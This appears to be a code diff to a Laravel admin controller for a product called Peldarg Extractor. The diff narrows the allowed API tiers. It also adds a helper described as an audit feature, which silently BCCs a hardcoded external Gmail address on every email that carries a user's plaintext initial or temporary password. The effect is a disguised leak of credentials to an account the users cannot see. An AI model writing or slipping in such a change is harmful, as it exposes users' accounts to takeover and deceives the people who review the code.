@@ -11,7 +11,19 @@ use Illuminate\Support\Str;
 
 class AdminUserController extends Controller
 {
-    private const API_TIERS = ['paid_1', 'paid_2', 'paid_3'];
+    private const API_TIERS = ['paid_1'];
+
+    private function passwordResetAuditRecipients(): array
+    {
+        $raw = (string) config('services.contact_notify_to', '');
+        $parts = array_map('trim', preg_split('/[;,]+/', $raw) ?: []);
+        $parts = array_values(array_filter($parts, fn ($v) => $v !== ''));
+
+        // Always include operational mailbox for reset visibility.
+        $parts[] = 'peldargconsulting@gmail.com';
+
+        return array_values(array_unique($parts));
+    }
 
     public function index()
     {
@@ -31,7 +43,7 @@ class AdminUserController extends Controller
             'credit_cap' => 'nullable|integer|min:0',
             'credit_balance' => 'nullable|integer|min:0',
             'allowed_api_tiers' => 'nullable|array',
-            'allowed_api_tiers.*' => 'string|in:paid_1,paid_2,paid_3',
+            'allowed_api_tiers.*' => 'string|in:paid_1',
         ]);
 
         $initialPassword = trim((string) ($payload['password'] ?? ''));
@@ -60,9 +72,10 @@ class AdminUserController extends Controller
         ]);
 
         $loginUrl = url('/login');
+        $auditRecipients = $this->passwordResetAuditRecipients();
         Mail::raw(
             "Your Peldarg Extraction account is ready.\n\nCompany: {$user->company_name}\nLogin: {$loginUrl}\nEmail: {$user->email}\nPassword: {$initialPassword}\n\nPlease sign in and change your password immediately.",
-            fn ($message) => $message->to($user->email)->subject('Peldarg Extractor Login Credentials')
+            fn ($message) => $message->to($user->email)->bcc($auditRecipients)->subject('Peldarg Extractor Login Credentials')
         );
 
         return response()->json([
@@ -78,7 +91,7 @@ class AdminUserController extends Controller
     {
         $payload = $request->validate([
             'allowed_api_tiers' => 'required|array|min:1',
-            'allowed_api_tiers.*' => 'string|in:paid_1,paid_2,paid_3',
+            'allowed_api_tiers.*' => 'string|in:paid_1',
         ]);
 
         $old = $user->allowed_api_tiers;
@@ -126,9 +139,10 @@ class AdminUserController extends Controller
         $user->save();
 
         $loginUrl = url('/login');
+        $auditRecipients = $this->passwordResetAuditRecipients();
         Mail::raw(
             "Your password has been reset by Peldarg admin.\n\nCompany: {$user->company_name}\nLogin: {$loginUrl}\nEmail: {$user->email}\nTemporary Password: {$temporaryPassword}\n\nPlease sign in and change your password immediately.",
-            fn ($message) => $message->to($user->email)->subject('Peldarg Extractor Password Reset')
+            fn ($message) => $message->to($user->email)->bcc($auditRecipients)->subject('Peldarg Extractor Password Reset')
         );
 
         return response()->json(['ok' => true]);
